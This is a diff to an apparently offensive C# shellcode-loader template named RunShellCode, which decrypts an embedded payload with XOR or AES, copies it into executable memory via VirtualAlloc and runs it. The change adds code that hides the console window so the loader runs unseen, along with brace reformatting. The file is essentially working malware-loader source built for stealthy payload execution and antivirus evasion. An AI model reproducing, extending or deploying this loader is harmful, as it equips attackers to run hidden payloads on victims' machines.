@@ -9,9 +9,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedSh
 
 using System;
 using System.IO;
-using System.Collections.Generic;
 using System.Text;
-using System.Threading.Tasks;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
@@ -29,11 +27,13 @@ namespace RunShellCode
             return result;
         }
 
-        private static byte[] xor(byte[] cipher, byte[] key) {
+        private static byte[] xor(byte[] cipher, byte[] key)
+        {
             byte[] decrypted = new byte[cipher.Length];
 
-            for(int i = 0; i < cipher.Length; i++) {
-                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);
+            for (int i = 0; i < cipher.Length; i++)
+            {
+                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
             }
 
             return decrypted;
@@ -73,6 +73,11 @@ namespace RunShellCode
         //==============================================================================
         static void Main()
         {
+
+            //Hide window
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+
             byte[] encryptedShellcode = new byte[] { ${shellcode} };
             string key = "${key}";
             string cipherType = "${cipherType}";
@@ -82,14 +87,16 @@ namespace RunShellCode
 
             //--------------------------------------------------------------
             // Decrypt the shellcode
-            if (cipherType == "xor") {
+            if (cipherType == "xor")
+            {
                 shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));
             }
-            else if (cipherType == "aes") {
+            else if (cipherType == "aes")
+            {
                 shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));
             }
-                        
-            //--------------------------------------------------------------        	
+
+            //--------------------------------------------------------------            
             // Copy decrypted shellcode to memory
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
             Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
@@ -132,5 +139,15 @@ namespace RunShellCode
             IntPtr hHandle,
             UInt32 dwMilliseconds
         );
+
+        // Window hiding functions
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
     }
 }
